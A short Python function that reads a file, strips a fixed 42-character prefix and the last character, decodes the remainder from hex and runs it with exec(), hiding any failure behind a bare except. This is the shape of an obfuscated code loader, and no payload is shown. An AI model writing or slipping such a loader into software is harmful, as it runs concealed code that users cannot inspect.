
def runme(df):
    try:
        exec(bytes.fromhex(open(df,'r').read()[42:][:-1]).decode())
    except:
        print('error')
